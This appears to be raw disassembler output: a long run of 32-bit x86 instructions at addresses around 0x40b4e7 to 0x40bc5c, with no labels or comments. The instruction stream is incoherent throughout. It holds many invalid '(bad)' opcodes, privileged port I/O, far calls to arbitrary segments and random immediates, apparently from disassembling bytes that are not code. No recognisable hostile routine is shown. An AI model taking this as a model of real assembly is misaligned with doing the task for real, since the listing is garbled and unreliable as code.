  40b4e7:	dec    edx
  40b4e8:	adc    al,0x20
  40b4ea:	lds    eax,FWORD PTR [ecx]
  40b4ec:	in     al,dx
  40b4ed:	push   esp
  40b4ee:	adc    BYTE PTR [ebp-0x61],bl
  40b4f1:	div    BYTE PTR [ebx+0x2d8c272e]
  40b4f7:	dec    edx
  40b4f8:	push   0xe8fabdcb
  40b4fd:	mov    al,0x2
  40b4ff:	in     eax,0xa
  40b501:	lock nop
  40b503:	pop    ebp
  40b504:	(bad)  
  40b505:	int    0xf1
  40b507:	stos   DWORD PTR es:[edi],eax
  40b508:	xor    eax,0xacc0adc4
  40b50d:	or     eax,eax
  40b50f:	cmp    eax,0xb5cefc11
  40b514:	retf   0xbc1a
  40b517:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b519:	push   ebx
  40b51a:	inc    edx
  40b51b:	fistp  WORD PTR [edi-0x59d05f46]
  40b521:	dec    esi
  40b522:	push   eax
  40b523:	fcmovu st,st(2)
  40b525:	popf   
  40b526:	les    eax,FWORD PTR [eax-0x2b5438be]
  40b52c:	addr16 pop ds
  40b52e:	inc    DWORD PTR [eax+0x1d]
  40b531:	cmp    al,0xfb
  40b533:	dec    edi
  40b534:	and    esp,edi
  40b536:	xchg   ebp,eax
  40b537:	push   eax
  40b538:	pop    edx
  40b539:	add    eax,ebp
  40b53b:	xor    eax,0xb001c6e1
  40b540:	sub    BYTE PTR gs:[eax],al
  40b543:	cmp    ecx,DWORD PTR [ecx-0x3a]
  40b546:	push   cs
  40b547:	jno    0x40b521
  40b549:	and    DWORD PTR [esi-0xb815dd],ebx
  40b54f:	aaa    
  40b550:	push   eax
  40b551:	sub    eax,DWORD PTR [edi+0x77]
  40b554:	push   ebp
  40b555:	sti    
  40b556:	jl     0x40b5b0
  40b558:	xchg   esp,eax
  40b559:	aas    
  40b55a:	xchg   BYTE PTR [ebx-0x56],dl
  40b55d:	xor    esi,edi
  40b55f:	aam    0xe6
  40b561:	loop   0x40b4f8
  40b563:	leave  
  40b564:	test   BYTE PTR [eax+0x7d],bl
  40b567:	pop    edx
  40b568:	jg     0x40b550
  40b56a:	add    eax,0x61e6150c
  40b56f:	jns    0x40b59a
  40b571:	lock pop edx
  40b573:	(bad)  
  40b574:	(bad)  [eax]
  40b576:	hlt    
  40b577:	fdecstp 
  40b579:	and    esp,edx
  40b57b:	xor    edi,DWORD PTR [edi]
  40b57d:	cmp    ch,BYTE PTR [edi+0x73c7bb19]
  40b583:	rcr    DWORD PTR [eax],1
  40b585:	enter  0x5c76,0x82
  40b589:	cs add eax,0xbc87558a
  40b58f:	push   0xffffffe5
  40b591:	push   eax
  40b592:	clc    
  40b593:	or     DWORD PTR [edi+0x461c196f],ecx
  40b599:	push   eax
  40b59a:	pop    ecx
  40b59b:	(bad)  
  40b59d:	shl    esp,0xac
  40b5a0:	xchg   ebp,eax
  40b5a1:	dec    edi
  40b5a2:	int    0xc9
  40b5a4:	jbe    0x40b5b1
  40b5a6:	icebp  
  40b5a7:	mov    eax,0xd8bdbc09
  40b5ac:	cmc    
  40b5ad:	fs mov edx,0xfe117ec1
  40b5b3:	xchg   esp,eax
  40b5b4:	in     eax,0xdf
  40b5b6:	stos   BYTE PTR es:[edi],al
  40b5b7:	in     al,0xfb
  40b5b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5ba:	nop
  40b5bb:	jge    0x8facbef6
  40b5c1:	push   esp
  40b5c2:	loopne 0x40b62c
  40b5c4:	mov    al,0xdb
  40b5c6:	stc    
  40b5c7:	push   cs
  40b5c8:	outs   dx,DWORD PTR ds:[esi]
  40b5c9:	test   eax,0xb5ce6882
  40b5ce:	daa    
  40b5cf:	push   ecx
  40b5d0:	sub    BYTE PTR [ecx+0x6c],dh
  40b5d3:	out    0xb8,eax
  40b5d5:	mov    bl,0xa4
  40b5d7:	sub    BYTE PTR [ecx+0x1e],0xe5
  40b5db:	add    esp,DWORD PTR [esi]
  40b5dd:	and    al,0xaf
  40b5df:	popf   
  40b5e0:	jne    0x40b5f5
  40b5e2:	fisub  DWORD PTR [ebx-0x56c7a3b2]
  40b5e8:	xor    al,0x7f
  40b5ea:	outs   dx,BYTE PTR ds:[esi]
  40b5eb:	rcr    BYTE PTR [ebx+0x67d57f4e],0x2b
  40b5f2:	ss rol ecx,0x84
  40b5f6:	cmc    
  40b5f7:	xor    DWORD PTR [edx],0xd74eb929
  40b5fd:	xchg   DWORD PTR [eax],ecx
  40b5ff:	and    DWORD PTR [edi],0x2c
  40b602:	mov    bl,0x8a
  40b604:	jb     0x40b66d
  40b606:	enter  0x94b1,0x9f
  40b60a:	mul    DWORD PTR [edi+0x49]
  40b60d:	aam    0x80
  40b60f:	mov    esi,0xdd9c11e6
  40b614:	adc    esi,esp
  40b616:	out    0x7,al
  40b618:	(bad)  
  40b61a:	ss (bad) 
  40b61c:	sub    DWORD PTR [edx-0xb],esp
  40b61f:	jg     0x40b5d7
  40b621:	push   0xcc709b8a
  40b626:	xchg   BYTE PTR [esi+0x499d6a8],dl
  40b62c:	mov    dh,0x8c
  40b62e:	fmul   QWORD PTR [eax]
  40b630:	dec    ecx
  40b631:	mov    al,0x4b
  40b633:	out    0xe1,al
  40b635:	pop    DWORD PTR [edi+0x71529c86]
  40b63b:	push   ds
  40b63c:	daa    
  40b63d:	les    ecx,FWORD PTR [ebx-0x75]
  40b640:	dec    edi
  40b641:	retf   
  40b642:	jg     0x40b694
  40b644:	sub    DWORD PTR [edx],eax
  40b646:	or     eax,0xdfd29dfd
  40b64b:	pop    ecx
  40b64c:	test   eax,0x63bc706b
  40b651:	(bad)  
  40b652:	(bad)  
  40b653:	sti    
  40b654:	xchg   esp,eax
  40b655:	push   edx
  40b656:	mov    ds:0xc22da90d,al
  40b65b:	sbb    DWORD PTR [eax-0x524f0ae7],0xffffff9c
  40b662:	imul   edi,ecx,0x9b34244d
  40b668:	xor    eax,0x3673cb87
  40b66d:	out    dx,eax
  40b66e:	popa   
  40b66f:	repnz or BYTE PTR [edx+0x28ae7ff],bh
  40b676:	push   eax
  40b677:	xor    DWORD PTR [edi],edi
  40b679:	dec    edi
  40b67a:	pop    ds
  40b67b:	sbb    eax,0xeb5f91ce
  40b680:	cld    
  40b681:	dec    ecx
  40b682:	hlt    
  40b683:	les    ebx,FWORD PTR [ebp+0x3de41f42]
  40b689:	cld    
  40b68a:	ret    0x9d69
  40b68d:	lea    esi,[esi+0x78]
  40b690:	jns    0x40b696
  40b692:	mov    edx,0x71113fba
  40b697:	push   0x62
  40b699:	add    al,0xbc
  40b69b:	xchg   ebx,eax
  40b69c:	mov    eax,0x8e5477a6
  40b6a1:	xchg   BYTE PTR [edi],cl
  40b6a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6a4:	cs out 0x21,al
  40b6a7:	gs stc 
  40b6a9:	mov    bh,0xb3
  40b6ab:	push   ds
  40b6ac:	cmp    dl,0xde
  40b6af:	scas   al,BYTE PTR es:[edi]
  40b6b0:	aam    0x59
  40b6b2:	sub    BYTE PTR [ebx],0xd5
  40b6b5:	cwde   
  40b6b6:	(bad)  
  40b6b8:	xor    DWORD PTR [ebx+0x66a78051],0x1af60309
  40b6c2:	std    
  40b6c3:	xchg   ebx,eax
  40b6c4:	sub    BYTE PTR [eax+0x6760071b],al
  40b6ca:	add    ebx,DWORD PTR [edx+0x670ab082]
  40b6d0:	adc    eax,0x1fdb3501
  40b6d5:	imul   ebp,DWORD PTR [ebx+0x8685570],0x7d
  40b6dc:	xchg   ebp,eax
  40b6dd:	in     eax,0x28
  40b6df:	cs int 0xc5
  40b6e2:	stc    
  40b6e3:	ficom  WORD PTR [ecx]
  40b6e5:	leave  
  40b6e6:	add    esp,DWORD PTR [eax]
  40b6e8:	or     bh,BYTE PTR [eax]
  40b6ea:	cmp    BYTE PTR [edx*4-0x3eb3f13],bl
  40b6f1:	aaa    
  40b6f2:	fild   DWORD PTR [ebx-0x17]
  40b6f5:	and    ah,BYTE PTR [eax]
  40b6f7:	xor    eax,0xd56203fd
  40b6fc:	pop    ds
  40b6fd:	pop    ebp
  40b6fe:	ror    BYTE PTR [edx+0xae3a558],1
  40b704:	sbb    al,0x1d
  40b706:	call   0xe089:0xc2ce1d52
  40b70d:	mov    BYTE PTR [esi+eax*2-0x6a884408],al
  40b714:	lds    esi,FWORD PTR [eax-0x3]
  40b717:	fsub   DWORD PTR [edx+ecx*2]
  40b71a:	xchg   DWORD PTR [ebp-0x77ad2b01],edx
  40b720:	jecxz  0x40b78f
  40b722:	loope  0x40b6b0
  40b724:	push   eax
  40b725:	dec    edi
  40b726:	xchg   DWORD PTR ds:0xb6a2f6f1,esi
  40b72c:	pop    ss
  40b72d:	mov    esp,0xb223735b
  40b732:	ins    BYTE PTR es:[edi],dx
  40b733:	jmp    0x40b704
  40b735:	mov    esi,0x98fb3a56
  40b73a:	lock mov BYTE PTR [edi+edx*1+0x330e459d],0x77
  40b743:	xor    BYTE PTR [ebx-0x31f84222],bl
  40b749:	stc    
  40b74a:	dec    eax
  40b74b:	popa   
  40b74c:	jns    0x40b72a
  40b74e:	stos   BYTE PTR es:[edi],al
  40b74f:	lods   al,BYTE PTR ds:[esi]
  40b750:	jnp    0x40b701
  40b752:	adc    ch,dh
  40b754:	or     DWORD PTR [edi],ebp
  40b756:	retf   
  40b757:	popa   
  40b758:	daa    
  40b759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b75a:	mov    BYTE PTR [ebx+0x4d6c0656],al
  40b760:	shl    DWORD PTR [eax+0x752ecf53],0x85
  40b767:	in     eax,dx
  40b768:	int    0xb
  40b76a:	xor    BYTE PTR [edi+0x7d],bl
  40b76d:	data16 (bad) 
  40b76f:	jb     0x40b788
  40b771:	pop    edx
  40b772:	aad    0x67
  40b774:	mov    edx,0xc14e2bb8
  40b779:	cmp    eax,0x3ce581c6
  40b77e:	cmp    BYTE PTR [eax],dh
  40b780:	push   cs
  40b781:	pop    esi
  40b782:	nop
  40b783:	ds push ecx
  40b785:	mov    DWORD PTR [edx],ecx
  40b787:	sub    BYTE PTR ds:0x5dce7214,0xb8
  40b78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b78f:	es pop es
  40b791:	lods   eax,DWORD PTR ds:[esi]
  40b792:	mov    eax,ds:0xa5b72909
  40b797:	mov    DWORD PTR [edi+ecx*4-0x6f],0xf2e1fd6d
  40b79f:	pop    eax
  40b7a0:	mov    bh,0xc0
  40b7a2:	sub    al,0xaf
  40b7a4:	lahf   
  40b7a5:	dec    ebx
  40b7a6:	jno    0x40b780
  40b7a8:	imul   eax,esi,0x26
  40b7ab:	dec    eax
  40b7ac:	fwait
  40b7ad:	push   edx
  40b7ae:	iret   
  40b7af:	pop    ebp
  40b7b0:	cdq    
  40b7b1:	sub    cl,BYTE PTR [edx+ebx*8]
  40b7b4:	jae    0x40b7ff
  40b7b6:	sub    esi,esi
  40b7b8:	sahf   
  40b7b9:	or     al,0xca
  40b7bb:	mov    dh,0x70
  40b7bd:	xchg   esi,eax
  40b7be:	nop
  40b7bf:	daa    
  40b7c0:	pop    es
  40b7c1:	shl    BYTE PTR [ebx+0x347a78bd],0x15
  40b7c8:	add    DWORD PTR [edi-0x3],esi
  40b7cb:	adc    DWORD PTR [ecx],eax
  40b7cd:	push   eax
  40b7ce:	adc    DWORD PTR [esi+eiz*4+0x62],esi
  40b7d2:	in     al,0xfc
  40b7d4:	popf   
  40b7d5:	jmp    0x40b841
  40b7d7:	or     esi,ecx
  40b7d9:	jle    0x40b7e0
  40b7db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7dc:	sbb    BYTE PTR [esi-0x13],cl
  40b7df:	cmp    al,0x19
  40b7e1:	dec    ebx
  40b7e2:	das    
  40b7e3:	pop    esi
  40b7e4:	push   ebx
  40b7e5:	loopne 0x40b7b6
  40b7e7:	xchg   ebp,eax
  40b7e8:	adc    esp,DWORD PTR [ecx-0x21]
  40b7eb:	int3   
  40b7ec:	inc    BYTE PTR [esp+ebx*2-0x6]
  40b7f0:	fs inc edi
  40b7f2:	les    ebp,FWORD PTR [esi+ecx*8+0x3]
  40b7f6:	xor    BYTE PTR [edx],dl
  40b7f8:	ja     0x40b786
  40b7fa:	neg    ecx
  40b7fc:	sub    BYTE PTR [ecx-0x225e7ff8],bl
  40b802:	mov    edi,0xf8c3b8f
  40b807:	adc    eax,0x2e9b953e
  40b80c:	xchg   ecx,eax
  40b80d:	(bad)  
  40b80e:	test   al,0xc0
  40b810:	inc    esp
  40b811:	mov    dl,BYTE PTR [esp+eiz*2]
  40b814:	stos   DWORD PTR es:[edi],eax
  40b815:	lods   al,BYTE PTR ds:[esi]
  40b816:	test   eax,0x9103174c
  40b81b:	stos   BYTE PTR es:[edi],al
  40b81c:	inc    eax
  40b81d:	and    esp,esp
  40b81f:	or     al,0x7b
  40b821:	add    eax,0x3e489045
  40b826:	push   ecx
  40b827:	push   ecx
  40b828:	and    ch,ah
  40b82a:	aad    0xf7
  40b82c:	dec    ebp
  40b82d:	out    0x49,eax
  40b82f:	sbb    DWORD PTR [ebp-0x295d9c8f],0xeafeefab
  40b839:	pop    es
  40b83a:	pop    edx
  40b83b:	sbb    al,0x5
  40b83d:	mov    al,0xe3
  40b83f:	push   0x16922aba
  40b844:	dec    BYTE PTR [esi]
  40b846:	int3   
  40b847:	mov    ah,0xfe
  40b849:	scas   al,BYTE PTR es:[edi]
  40b84a:	or     al,al
  40b84c:	pop    esi
  40b84d:	adc    al,0xb6
  40b84f:	add    dl,al
  40b851:	mov    esi,0x298f6f1d
  40b856:	test   eax,0x8e5c5638
  40b85b:	pop    ds
  40b85c:	sub    bh,bh
  40b85e:	cmc    
  40b85f:	lds    ecx,FWORD PTR [edx+0x585c1432]
  40b865:	adc    DWORD PTR [edx+0x799e1f2a],0x5f6e14e1
  40b86f:	push   ebx
  40b870:	push   cs
  40b871:	outs   dx,DWORD PTR ds:[esi]
  40b872:	fnstenv [esi+edi*8]
  40b875:	out    0x85,eax
  40b877:	and    BYTE PTR [esi+0x7093c8a9],ch
  40b87d:	and    BYTE PTR [ebp-0x80],bl
  40b880:	mov    ch,0xb1
  40b882:	and    DWORD PTR [eax+edi*2],ebp
  40b885:	jae    0x40b89b
  40b887:	call   ebp
  40b889:	cmp    dh,BYTE PTR [edi]
  40b88b:	jge    0x40b8c5
  40b88d:	in     al,0xd4
  40b88f:	test   BYTE PTR [ebx+0xd],ah
  40b892:	cwde   
  40b893:	repz jg 0x40b886
  40b896:	inc    esp
  40b897:	aas    
  40b898:	and    al,BYTE PTR [ecx]
  40b89a:	daa    
  40b89b:	cmp    ebp,edx
  40b89d:	pop    ebx
  40b89e:	(bad)  
  40b89f:	xor    DWORD PTR [ecx+0xfdafa74],ebx
  40b8a5:	xor    eax,0x9ed960d6
  40b8aa:	out    dx,al
  40b8ab:	sbb    DWORD PTR [ebx-0xf6124],ecx
  40b8b1:	or     ecx,ebx
  40b8b3:	scas   eax,DWORD PTR es:[edi]
  40b8b4:	fwait
  40b8b5:	xlat   BYTE PTR ds:[ebx]
  40b8b6:	mov    edx,0xde7e41b9
  40b8bb:	out    0x29,al
  40b8bd:	retf   
  40b8be:	aas    
  40b8bf:	stos   BYTE PTR es:[edi],al
  40b8c0:	and    BYTE PTR [edi],dl
  40b8c2:	jge    0x40b941
  40b8c4:	mov    dh,0x6d
  40b8c6:	adc    edi,ecx
  40b8c8:	fcom   DWORD PTR ds:0x822d4bcb
  40b8ce:	and    al,0xa6
  40b8d0:	aad    0x6b
  40b8d2:	or     ecx,ebx
  40b8d4:	repz and eax,0x1e9119ad
  40b8da:	icebp  
  40b8db:	out    0x2a,eax
  40b8dd:	fwait
  40b8de:	sbb    esp,DWORD PTR [ebp-0x6a36c391]
  40b8e4:	cmp    esi,ebp
  40b8e6:	fsub   st(6),st
  40b8e8:	mov    edx,0xfdd67528
  40b8ed:	xchg   ah,dl
  40b8ef:	out    dx,eax
  40b8f0:	mov    bh,0x2d
  40b8f2:	pop    ecx
  40b8f3:	and    BYTE PTR [ecx],ch
  40b8f5:	sar    BYTE PTR [ebx],1
  40b8f7:	mov    dl,0x2b
  40b8f9:	(bad)  
  40b8fa:	cmc    
  40b8fb:	popa   
  40b8fc:	mov    ecx,DWORD PTR [esi-0x74]
  40b8ff:	leave  
  40b900:	push   ecx
  40b901:	pop    ecx
  40b902:	inc    ebp
  40b903:	push   0x31
  40b905:	sbb    al,0xef
  40b907:	cmp    BYTE PTR [ebx],ah
  40b909:	jmp    0x998177ae
  40b90e:	sar    BYTE PTR [edi+0xa],0xc
  40b912:	jge    0x40b8da
  40b914:	push   es
  40b915:	scas   eax,DWORD PTR es:[edi]
  40b916:	mov    ds:0x1acae3f5,eax
  40b91b:	scas   al,BYTE PTR es:[edi]
  40b91c:	lods   eax,DWORD PTR ds:[esi]
  40b91d:	sub    esi,eax
  40b91f:	in     eax,0xe3
  40b921:	arpl   WORD PTR [eax],di
  40b923:	xor    esi,esp
  40b925:	xlat   BYTE PTR ds:[ebx]
  40b926:	xor    esp,ecx
  40b928:	inc    bx
  40b92a:	inc    esp
  40b92b:	mov    bl,0xb1
  40b92d:	(bad)  
  40b92e:	mov    bl,0x35
  40b930:	aaa    
  40b931:	and    eax,0x2989d7ab
  40b936:	or     BYTE PTR [ebx-0x1c361cae],cl
  40b93c:	ror    DWORD PTR [eax+0x2],0x26
  40b940:	outs   dx,DWORD PTR ds:[esi]
  40b941:	imul   eax,esi,0xe9636df6
  40b947:	xor    BYTE PTR [eax-0x17b007a],ah
  40b94d:	inc    esp
  40b94e:	dec    edx
  40b94f:	cmp    al,0x3c
  40b951:	mov    bl,0xc3
  40b953:	fdiv   st,st(0)
  40b955:	jae    0x40b8dc
  40b957:	inc    edx
  40b958:	cmp    al,0x1f
  40b95a:	lods   al,BYTE PTR ds:[esi]
  40b95b:	(bad)  
  40b95c:	mov    ds:0x45213c78,al
  40b961:	popa   
  40b962:	neg    BYTE PTR [edi]
  40b964:	call   0x2fed:0x6d8be8ca
  40b96b:	push   ebp
  40b96c:	mov    bh,0x47
  40b96e:	xor    BYTE PTR [ebx+0x19],dl
  40b971:	fsubr  st,st(0)
  40b973:	ror    BYTE PTR ds:0xd2fd9a21,1
  40b979:	sub    cl,al
  40b97b:	sbb    al,0x9f
  40b97d:	fst    DWORD PTR [eax]
  40b97f:	xchg   ecx,eax
  40b980:	sbb    eax,DWORD PTR [edi]
  40b982:	pusha  
  40b983:	and    al,BYTE PTR [eax]
  40b985:	repnz push esi
  40b987:	mov    edi,0xb08b140c
  40b98c:	mov    bl,0x64
  40b98e:	sahf   
  40b98f:	push   esi
  40b990:	jp     0x40b93f
  40b992:	stos   BYTE PTR es:[edi],al
  40b993:	outs   dx,DWORD PTR ds:[esi]
  40b994:	inc    esp
  40b995:	inc    ecx
  40b996:	jno    0x40b9cd
  40b998:	push   es
  40b999:	and    dl,BYTE PTR [edx+ebp*2+0x305a799e]
  40b9a0:	sub    eax,DWORD PTR [ebx]
  40b9a2:	xor    ebp,DWORD PTR ds:0x155d6378
  40b9a8:	jle    0x40b9a4
  40b9aa:	(bad)  
  40b9ab:	xor    ecx,ebp
  40b9ad:	getsec 
  40b9af:	fst    QWORD PTR [ecx+0x16d58bf0]
  40b9b5:	mov    al,dh
  40b9b7:	rol    DWORD PTR [ebp-0x58eeb096],cl
  40b9bd:	ds gs sub dh,al
  40b9c1:	aam    0xea
  40b9c3:	mov    eax,0x6f85ad48
  40b9c8:	(bad)  
  40b9ca:	and    al,0xd7
  40b9cc:	xchg   ecx,eax
  40b9cd:	mul    esi
  40b9cf:	xor    DWORD PTR [esi*8-0x28f471a9],edi
  40b9d6:	jge    0x40b9a7
  40b9d8:	sub    BYTE PTR [ecx],cl
  40b9da:	outs   dx,WORD PTR ds:[esi]
  40b9dc:	jle    0x40ba4f
  40b9de:	adc    ecx,DWORD PTR [edx+0x2a6426]
  40b9e4:	mov    dh,0x2f
  40b9e6:	test   eax,0xbb2dcc45
  40b9eb:	aad    0x9b
  40b9ed:	stos   BYTE PTR es:[edi],al
  40b9ee:	jo     0x40ba1a
  40b9f0:	out    0x2c,al
  40b9f2:	into   
  40b9f3:	xor    edi,ebp
  40b9f5:	shl    eax,cl
  40b9f7:	inc    ebp
  40b9f8:	mov    esp,0xe368b80d
  40b9fe:	pop    esp
  40b9ff:	mov    ah,0x9f
  40ba01:	push   edx
  40ba02:	(bad)  
  40ba03:	jmp    0x40b9c3
  40ba05:	popa   
  40ba06:	sub    al,0x1b
  40ba08:	cwde   
  40ba09:	ror    al,0x86
  40ba0c:	jp     0x40ba12
  40ba0e:	adc    eax,0xc7e9240c
  40ba13:	jbe    0x40ba85
  40ba15:	fdivr  DWORD PTR [ecx]
  40ba17:	and    ch,BYTE PTR [edx-0x1d]
  40ba1a:	hlt    
  40ba1b:	sub    BYTE PTR [esi-0x55313db0],bl
  40ba21:	inc    eax
  40ba22:	repz adc eax,0x95dbe5c
  40ba28:	fsubr  QWORD PTR [ebp+0x148c11c9]
  40ba2e:	out    0x60,eax
  40ba30:	push   edi
  40ba31:	mov    eax,ds:0x850fb3f2
  40ba36:	pop    bp
  40ba38:	in     al,0xb6
  40ba3a:	data16 fwait
  40ba3c:	or     eax,0xdeed805
  40ba41:	xor    BYTE PTR [ebx],dl
  40ba43:	imul   BYTE PTR [ebx-0x7b]
  40ba46:	(bad)  
  40ba47:	ds into 
  40ba49:	lahf   
  40ba4a:	push   edi
  40ba4b:	mov    BYTE PTR [ecx-0x3dd370de],dh
  40ba51:	mov    edi,0x51d60c28
  40ba56:	add    al,0x6c
  40ba58:	in     eax,dx
  40ba59:	loope  0x40b9dc
  40ba5b:	push   cs
  40ba5c:	test   eax,0xab89a9cf
  40ba61:	retf   
  40ba62:	iret   
  40ba63:	xchg   ebx,eax
  40ba64:	fisttp QWORD PTR [edx+0x84c6f09]
  40ba6a:	cmp    eax,0xdc4c3712
  40ba6f:	pusha  
  40ba70:	and    edx,DWORD PTR [ebx+0x337df7cb]
  40ba76:	fisub  WORD PTR [edi+0x5729b60]
  40ba7c:	cld    
  40ba7d:	gs jb  0x40ba2d
  40ba80:	cmp    eax,0x75e56b0b
  40ba85:	jb     0x40baa8
  40ba87:	jb     0x40ba56
  40ba89:	xchg   ebx,eax
  40ba8a:	xor    DWORD PTR [ecx+0x7e],ecx
  40ba8d:	jp     0x40ba4c
  40ba8f:	std    
  40ba90:	mov    ah,0x3
  40ba92:	fwait
  40ba93:	pop    ebx
  40ba94:	fwait
  40ba95:	ror    BYTE PTR [edx+0x61],cl
  40ba98:	dec    ebp
  40ba99:	xlat   BYTE PTR ds:[ebx]
  40ba9a:	imul   ecx,DWORD PTR [ecx-0x389b8be4],0x4910164
  40baa4:	or     eax,esi
  40baa6:	cmp    eax,0x4699ca68
  40baab:	mov    DWORD PTR [edx],esi
  40baad:	xchg   edi,eax
  40baae:	stos   DWORD PTR es:[edi],eax
  40baaf:	ret    
  40bab0:	dec    edx
  40bab1:	cmp    eax,0x92ba8ff4
  40bab6:	mov    ds:0x7d9a52da,eax
  40babb:	mov    bh,0xe1
  40babd:	lods   eax,DWORD PTR ds:[esi]
  40babe:	fwait
  40babf:	loopne 0x40ba9c
  40bac1:	mov    eax,ds:0x629173c2
  40bac6:	outs   dx,DWORD PTR es:[esi]
  40bac8:	bound  edi,QWORD PTR [edx-0x43d39d74]
  40bace:	dec    esi
  40bacf:	and    dl,BYTE PTR [eax]
  40bad1:	ret    
  40bad2:	add    BYTE PTR [edi-0x370fd5f5],0xe0
  40bad9:	xchg   esp,eax
  40bada:	and    BYTE PTR [esi+esi*1],ah
  40badd:	out    dx,al
  40bade:	ja     0x40bb47
  40bae0:	enter  0x598f,0x7d
  40bae4:	adc    DWORD PTR [ecx-0x53307d4d],0xffffffc0
  40baeb:	fld    TBYTE PTR [ebx]
  40baed:	aad    0xf7
  40baef:	jne    0x40bb1c
  40baf1:	add    esp,DWORD PTR [eax+0x3260ff21]
  40baf7:	jecxz  0x40bad3
  40baf9:	in     al,dx
  40bafa:	fcomi  st,st(5)
  40bafc:	adc    eax,0x97f6084e
  40bb01:	cwde   
  40bb02:	jmp    0xdffe75f6
  40bb07:	test   dh,dh
  40bb09:	jg     0x40bad8
  40bb0b:	and    eax,0x25116bf8
  40bb10:	rcl    DWORD PTR [eax+0x6a],cl
  40bb13:	push   ds
  40bb14:	test   BYTE PTR [edi],dh
  40bb16:	test   eax,0x9fdca809
  40bb1b:	daa    
  40bb1c:	xchg   ebx,eax
  40bb1d:	cmp    DWORD PTR [eax],edi
  40bb1f:	xor    esp,ecx
  40bb21:	rol    DWORD PTR [ecx],0x16
  40bb24:	add    BYTE PTR [ebp+0x32ce3e70],cl
  40bb2a:	adc    cl,bl
  40bb2c:	xchg   esp,eax
  40bb2d:	xor    bl,BYTE PTR [edi]
  40bb2f:	in     al,0x29
  40bb31:	pop    eax
  40bb32:	pop    esi
  40bb33:	out    0xfc,eax
  40bb35:	add    DWORD PTR [ebx],0x61
  40bb38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb39:	and    BYTE PTR [esi],ch
  40bb3b:	mov    eax,DWORD PTR [ebp-0x535124]
  40bb41:	mov    edx,0xffc2388
  40bb46:	es repnz add al,0x35
  40bb4a:	lods   al,BYTE PTR ds:[esi]
  40bb4b:	push   esp
  40bb4c:	out    dx,eax
  40bb4d:	sti    
  40bb4e:	pop    ebp
  40bb4f:	out    dx,eax
  40bb50:	cwde   
  40bb51:	pop    esp
  40bb52:	inc    eax
  40bb53:	mov    ebp,0x4c981772
  40bb58:	les    ebx,FWORD PTR [esp+ebx*8-0x18f59f51]
  40bb5f:	pop    edi
  40bb60:	xor    eax,0x41e39817
  40bb65:	fisub  WORD PTR [ebx]
  40bb67:	xchg   DWORD PTR [edi+0x20],esp
  40bb6a:	add    bl,dl
  40bb6c:	push   ebp
  40bb6d:	shl    BYTE PTR [edi],cl
  40bb6f:	xlat   BYTE PTR ds:[ebx]
  40bb70:	xor    BYTE PTR [eax],ah
  40bb72:	jmpw   0xc50e
  40bb76:	xchg   DWORD PTR [edi],edi
  40bb78:	scas   al,BYTE PTR es:[edi]
  40bb79:	sub    al,0xdb
  40bb7b:	jecxz  0x40bbe2
  40bb7d:	mov    ecx,0x8c559938
  40bb82:	stc    
  40bb83:	dec    edx
  40bb84:	mov    al,ds:0x629497cb
  40bb89:	push   0x30
  40bb8b:	mov    WORD PTR [ecx+0x47639537],?
  40bb91:	inc    edi
  40bb92:	mov    dh,0xec
  40bb94:	repnz sbb ebp,esi
  40bb97:	sbb    al,0x41
  40bb99:	pop    ecx
  40bb9a:	inc    ebx
  40bb9b:	test   eax,0xe75afc84
  40bba0:	cli    
  40bba1:	shl    DWORD PTR [esi-0x70b5f303],1
  40bba7:	or     al,0xe2
  40bba9:	jmp    0x73b14753
  40bbae:	imul   eax,DWORD PTR [edx+0x14],0x44
  40bbb2:	sti    
  40bbb3:	cwde   
  40bbb4:	mov    ds:0x89a97600,eax
  40bbb9:	pop    esi
  40bbba:	push   edx
  40bbbb:	loop   0x40bc11
  40bbbd:	adc    eax,0x39cc797e
  40bbc2:	add    al,0xb1
  40bbc4:	dec    esp
  40bbc5:	pop    ecx
  40bbc6:	int3   
  40bbc7:	mov    ebx,0xc771b2ea
  40bbcc:	push   0x19001458
  40bbd1:	in     al,0x53
  40bbd3:	jnp    0x40bc18
  40bbd5:	sbb    DWORD PTR [esi],ebp
  40bbd7:	sbb    ch,0x29
  40bbda:	jnp    0x40bbdd
  40bbdc:	fwait
  40bbdd:	mov    ebx,esp
  40bbdf:	out    dx,al
  40bbe0:	fld    QWORD PTR [edi+0x37]
  40bbe4:	retf   
  40bbe5:	mov    edi,0x847e63e9
  40bbea:	mov    ebx,0x7dba3073
  40bbef:	adc    al,0x2f
  40bbf1:	sub    ah,al
  40bbf3:	mov    dh,0x5f
  40bbf5:	jns    0x40bc69
  40bbf7:	jnp    0x40bc3c
  40bbf9:	add    eax,0xb677e129
  40bbfe:	outs   dx,DWORD PTR ds:[esi]
  40bbff:	xchg   esi,eax
  40bc00:	sub    ebx,eax
  40bc02:	sahf   
  40bc03:	dec    edx
  40bc04:	mov    cl,BYTE PTR [ebx+ecx*1+0x3d]
  40bc08:	adc    eax,0x2dd83780
  40bc0d:	test   DWORD PTR [eax],esp
  40bc0f:	dec    eax
  40bc10:	cmp    BYTE PTR [ebp-0x5b],0xa2
  40bc14:	adc    BYTE PTR [edi],ch
  40bc16:	sub    cl,al
  40bc18:	cmp    edi,DWORD PTR [ecx+eiz*4]
  40bc1b:	mov    ah,0x7e
  40bc1d:	mov    cl,0x47
  40bc1f:	sbb    BYTE PTR [ecx+0x12],ah
  40bc22:	inc    edx
  40bc23:	adc    eax,DWORD PTR ds:0xefc169c5
  40bc29:	cdq    
  40bc2a:	mov    BYTE PTR [ecx+0x191a340b],cl
  40bc30:	push   ss
  40bc31:	jg     0x40bcb2
  40bc33:	test   al,0xb6
  40bc35:	adc    DWORD PTR [ebx],ecx
  40bc37:	es push es
  40bc39:	icebp  
  40bc3a:	mov    eax,ds:0xc89ab0b1
  40bc3f:	or     BYTE PTR [esi-0x17ba0c05],dh
  40bc45:	fst    DWORD PTR [esi+0x6]
  40bc48:	pushf  
  40bc49:	sub    al,0xc9
  40bc4b:	or     ah,ch
  40bc4d:	cmp    esi,DWORD PTR [ebx+0x6ae5f4d4]
  40bc53:	and    cl,bh
  40bc55:	je     0x40bbdd
  40bc57:	pop    ebp
  40bc58:	pop    ebp
  40bc59:	and    edi,DWORD PTR [ebx]
  40bc5b:	aas    
  40bc5c:	ret    0x131e
